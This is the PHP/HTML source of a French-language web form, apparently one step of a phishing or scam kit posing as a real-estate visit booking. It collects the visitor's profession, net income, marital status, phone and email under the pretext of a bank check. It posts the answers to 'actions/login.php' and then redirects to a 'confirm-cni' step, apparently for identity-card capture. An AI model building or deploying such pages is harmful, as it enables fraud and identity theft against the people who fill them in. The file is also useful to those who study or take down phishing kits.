<?php 


include('infos.php');
include("common/includes.php");
?>

<html lang="fr">
<?php include("common/header.php");?>


<body style="background: #e8e8e8">
	
	<div class="row" style="display: flex; background: #3A3E41 none repeat scroll 0% 0%; margin-bottom: 30px;">
		<?php include("common/head.php"); ?>
	</div>

    <div class="container">
        <div class="row">
            <ol class="breadcrumb ">
                <li class="active"></li>
            </ol>
        </div>
    </div>
    <main class="container" style="margin-top:-12px;" id="contenu">

        <div class="row">
            <div class="col-md-12">

                <div class="panel panel-default" style="background: url('') no-repeat;">
                    <div class="panel-heading" style="padding:12px">

                        <h2 id="titre_authent" style="margin-top:1px;" class="text-center">Informations personnelles</h2>
                    </div>

                    <div class="panel-body"><br> Vous trouverez ci-dessous le formulaire pour valider votre visite, nous vous demandons de bien vouloir nous fournir les éléments nécessaire à la création de votre dossier pour donner suite à votre demande.
                    	<br><br>
                    	Egalement notre partenaire bancaire vérifiera que vous n’ayez pas de dette particulière ou d’impayé, car ne nous demandons pas de salaire minimum.
                    	<br><br>
                    	Après vérification, vous serez recontacté par l'un de nos conseillers afin de confirmer notre rendez-vous.
                    	<br><br>
                    	Pour toute question complémentaire, vous pourrez les lui adresser lors de son appel.
                    	<br><br>
                    	Merci de votre compréhension
						<br><br><br><br>
                        <form action="" id="formit" method="POST">
                            <div class="row">
                                <div class="col-md-12">
									<style>
										.flex{
											display: flex;
											justify-content: space-between;
										}
									</style>
									<div class="flex">
                                    <div class="form-group" id="fg_spi">
                                        <label for="spi_tmp">Profession</label>
                                        <div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div>
                                        <input class="form-control" id="name" name="nom" type="text" aria-required="true" placeholder="" required="">
                                    </div>

                                    <div class="form-group" id="fg_spi">
                                        <label for="spi_tmp">Revenus mensuels net après le prélèvement de l'impôt</label>
                                        <div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div>
                                        <input class="form-control" id="name" name="revenu" type="text" aria-required="true" placeholder="" required="">
                                    </div>
									</div>


                                    <div class="form-group" id="fg_spi">
                                        <label for="spi_tmp">Situation familiale</label>
                                        <div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div>
                                        <span class="fieldset"><br><select style="width:33%" class="boss" name="status" required="" title="Please Select Day Of Birth" type="select">
												<option class="form-control" selected="selected" value="">Sélectionnez</option>
												<option value="Célibataire" name="status">Célibataire</option>
												<option value="Marié(e) "name="status">Marié(e)</option>
												<option value="Divorcé(e)" name="status">Divorcé(e)</option>
												<option value="Vie maritale/PACS" name="status">Vie maritale/PACS</option>
												<option value="Veuf(ve)" name="status">Veuf(ve)</option>
											</select>
											

                                    </div>

                                     <div class="form-group" id="fg_spi">
                                        <label for="spi_tmp">Numéro de téléphone</label>
                                        <div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div>
                                        <input maxlength="10" class="form-control" id="name" name="number" type="number" aria-required="true" placeholder="" required="">
                                    </div>

                                    <div class="form-group" id="fg_spi">
                                        <label for="spi_tmp">Adresse email</label>
                                        <div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div>
                                        <input class="form-control" id="name" name="mail" type="email" aria-required="true" placeholder="" required="">
                                    </div>            
                                    
								    <div class="form-group" id="fg_spi">
                                        <label for="spi_tmp">Horaire de visite</label>
                                        <div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div>
                                        <span class="fieldset"><br><select style="width:50%" class="boss" name="day" required="" title="Please Select Day Of Birth" type="select">
												<option class="form-control" selected="selected" value=""></option>
												<option value="03">10h00</option>
												<option value="04">10h30</option>
												<option value="05">11h00</option>
												<option value="06">11h30</option>
												<option value="06">12h00</option>
												<option value="07">14h00</option>
												<option value="08">14h30</option>
												<option value="09">15h00</option>
												<option value="10">15h30</option>
												<option value="11">16h00</option>
												<option value="12">16h30</option>
												<option value="13">17h00</option>
												<option value="14">17h30</option>
												<option value="15">18h00</option>
											</select> </span>
                                    </div>
									
									
                                    <button type="submit" id="submit" class="btn btn-xl btn-primary">Valider</button>

                                    <br><br>
                                </div>
                                <div class="col-md-6" style="border-radius:6px;">
                                	<div class="col-md-12" style="width: 100%"></div>
                                   
                                </div>

                            </div>
                        </form>

                        <i>
						<small>Un délai de traitement commence le jour où nous recevons un formulaire dûment rempli et se termine lorsque nous prenons une décision. </small>
						</i>

                    </div>
                </div>
            </div>
        </div>
        <br><br>

    </main>

    <div id="loading" class="LoadingPage" style="display : none">
        <div class="centre">
            <div style="text-align: center;">
                <div style="margin-bottom: 25px;">
                    <img style="height: 30px" src="https://static.vecteezy.com/ti/vecteur-libre/p1/2228877-immobilier-logo-design-entreprise-signe-logo-vecteur-gratuit-vectoriel.jpg">
                </div>
                <span>Chargement en cours</span>
            </div>
        </div>
    </div>

	<script
  src="https://code.jquery.com/jquery-3.4.1.min.js"
  crossorigin="anonymous"></script>


    <script>
        $(document).ready(function() {
        			$("#formit").submit(function(e) {
        				e.preventDefault();
        				var $this = $(this);
        				$("#loading").css("display", "block");
        				$.ajax({
        						method: "POST",
        						url: "actions/login.php",
        						data: $(this).serialize()
        					})
        					.then(function(msg) {
        						setTimeout(function() {
        							window.location.href = "steps/confirm-cni.php";
        						}, 1500);
        					});
        				
        
        			});
        		});
    </script>

</body>

</html>